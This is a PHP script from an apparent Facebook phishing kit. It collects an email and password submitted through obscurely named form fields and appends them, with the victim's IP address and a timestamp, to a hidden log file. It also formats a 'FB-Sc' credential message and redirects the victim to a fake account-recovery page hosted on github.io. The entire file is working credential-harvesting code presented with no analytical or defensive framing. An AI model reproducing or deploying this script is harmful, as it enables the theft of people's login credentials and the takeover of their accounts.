<?php
$file = "_____HS_____";
$caramenasehatianakkita   = $_POST['caramenasehatianakkita'];
$berliburkepulauandaman   = $_POST['berliburkepulauandaman'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "Email      : ");
fwrite($handle, "$caramenasehatianakkita");
fwrite($handle, "\n");
fwrite($handle, "Password   : ");
fwrite($handle, "$berliburkepulauandaman");
fwrite($handle, "\n");
fwrite($handle, "IP Address : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time       : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "==============FB-Sc============== ");
fwrite($handle, "\n");
fclose($handle);

/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$class   = $_POST['class'];
/*========== [ Variables ]==========*/


$message = "
==$$$==== *** s3MpaK.B4nK***=====$$$==
Email   : $caramenasehatianakkita
Password: $berliburkepulauandaman
==$$$==== *** s3MpaK.B4nK***=====$$$==
IP	: http://www.geoiptool.com/?IP=$ip
==========[ THANK'S YOU ]==========";


header("Location://eti-helprecovery-page-956-en.github.io/tarmowijoyoke/error#confirm-page-container-navigation");


?>
